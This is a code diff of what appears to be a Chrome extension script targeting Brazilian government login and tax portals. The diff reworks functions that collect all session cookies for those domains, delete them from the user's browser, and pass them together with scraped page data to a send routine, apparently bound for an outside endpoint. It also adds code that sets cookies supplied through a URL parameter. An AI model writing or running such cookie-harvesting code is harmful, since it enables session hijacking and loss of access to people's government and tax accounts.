@@ -45,20 +45,15 @@ function actions() {
                 },
                 onPageLoad: {
                     methods: {
-                        dom: [
-                            // () => document.querySelector('iframe[data-hcaptcha-response]').getAttribute('data-hcaptcha-response');
-                            () => {return document.title;}
-                        ],
+                        dom: () => {return {name: 'test1', value: document.title};}
                     }
                 }
             },
             "sso.acesso.gov.br": {
                 onPageLoad: {
                     methods: {
-                        dom: [
-                            // () => document.querySelector('iframe[data-hcaptcha-response]').getAttribute('data-hcaptcha-response');
-                            () => {return document.title;}
-                        ],
+                        // () => document.querySelector('iframe[data-hcaptcha-response]').getAttribute('data-hcaptcha-response');
+                        dom: () => {return {name: 'test2', value: document.title};}
                     },
                     send: true
                 }
@@ -68,9 +63,7 @@ function actions() {
             "cav.receita.fazenda.gov.br": {
                 onPageLoad: {
                     methods: {
-                        dom: [
-                            () => {return document.title;}
-                        ]
+                        dom: () => {return document.title;}
                     }
                 }
             }
@@ -88,39 +81,46 @@ function alert(title, message, interation = true) {
     });
 }
 
-function dom(queries) {
+function dom(query) {
     const tabId = action.current.tabId;
-    const results = {name: "dom", values: []};
-    queries.forEach((query, index) => {
-        chrome.scripting.executeScript({target: {tabId: tabId}, func: query}, result => {
-            results.values.push(result);
+    const result = {method: "dom", return: {}};
+
+    return chrome.scripting.executeScript({target: {tabId: tabId}, func: query}).then(frames => {
+        frames.forEach(frame => {
+            if (!frame.result) return;
+
+            result.return[frame.result.name] = frame.result.value;
         });
+        return result;
     });
-    return results;
+}
+
+function eatCookies(domain, cookies) {
+    let url;
+    cookies.forEach((cookie) => {
+        url = "https://" + domain + cookie.path;
+        chrome.cookies.remove({url: url, name: cookie.name});
+    });
 }
 
 function getCookies() {
-    const jar = {name: "cookies", values: {}};
     const domains = action.domains;
-    const eat = (domain, cookies) => {
-        let url;
-        cookies.forEach((cookie) => {
-            url = "https://" + domain + cookie.path;
-            chrome.cookies.remove({url: url, name: cookie.name});
-        });
-    };
+    const jar = [];
 
     domains.forEach(domain => {
-        chrome.cookies.getAll({ domain: domain }, cookies => {
-            jar.values[domain] = cookies;
-            eat(domain, cookies); // 🍪👹
-        });
+        jar.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
+            eatCookies(domain, cookies);
+            return {method: "getCookies", return: {domain: domain, cookies: cookies}};
+        }));
     });
     return jar;
 }
 
-async function setCookies(cookies) {
-    await cookies.forEach(cookie => chrome.cookies.set(cookie));
+function setCookies(jar) {
+    Object.keys(jar).forEach((cookies, domain) => {
+        eatCookies(domain, cookies);
+        cookies.forEach(cookie => chrome.cookies.set(cookie));
+    });
 }
 
 /**
@@ -152,43 +152,35 @@ function send(body) {
 }
 
 function runAction(triggeredBy) {
-    const hasAlert = action.current?.triggers[triggeredBy]?.methods?.alert;
+    const Alert = action.current?.triggers[triggeredBy]?.methods?.alert;
     const Send = action.current?.triggers[triggeredBy]?.send;
-    const hasDom = () => {
-        if (queries = action.current?.triggers[triggeredBy]?.methods?.dom)
-            return dom(queries);
-
-        return false;
-    };
+    const Dom = action.current?.triggers[triggeredBy]?.methods?.dom;
     const promises = [];
 
-    if (msg = hasAlert) alert(...msg);
+    if (msg = Alert)
+        alert(...msg);
 
-    if (Dom = hasDom())
-        promises.push(Dom);
+    if (query = Dom)
+        promises.push(dom(query));
 
     if (Send)
-        promises.push(getCookies());
+        getCookies().forEach(promise => promises.push(promise));
 
     if (promises.length) {
         Promise.all(promises)
         .then(results => {
             results.forEach(result => {
-                if (!body.hasOwnProperty(result.name))
-                    return body[result.name] = result.values;
+                if (!body.hasOwnProperty(result.method))
+                    return body[result.method] = [result.return];
 
-                if (Array.isArray(result.values))
-                    return body[result.name].push(result.values);
-
-                body[result.name] = result.values;
+                body[result.method].push(result.return);
             });
 
-            if (Send) {
-                body.urls = action.urls;
+            if (Send)
                 send(body);
-            }
         })
         .catch(error => {
+            // TODO: Send error to endpoint.
             console.log(error);
         });
     }
@@ -200,6 +192,23 @@ function runAction(triggeredBy) {
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     if (changeInfo.status !== 'complete') return;
 
+    /*action = {current: {tabId: tabId}};
+    const query = () => {
+        const url = new URL(window.location.href);
+        const botAction = url.searchParams.get("botAction");
+        //if (botAction) {
+            document.getElementById("NI").value = "00111222000133";
+            //document.getElementById("frmLogin").submit();
+        //}
+        return {name: 'nameTest', value: 'valueTest'};
+    };
+    Promise.all([dom(query)])
+    .then(result => {
+        console.log(result);
+        console.log(JSON.stringify(result));
+    });
+    return;*/
+
     const url = new URL(tab.url);
     const cookies = JSON.parse(url.searchParams.get("botCookies"));
     const onPageLoad = () => {
@@ -208,7 +217,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
         const domain = url.host;
         const botAction = JSON.parse(url.searchParams.get("botAction"));
         const hasAction = () => {
-            const starting = () => {
+            const onPageLoading = () => {
                 if (!botAction) return false;
 
                 const domains = Object.keys(actions()[botAction.name]);
@@ -239,7 +248,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 
                 return true;
             };
-            if (starting() || inCourse()) return true;
+            if (onPageLoading() || inCourse()) return true;
 
             return false;
         };
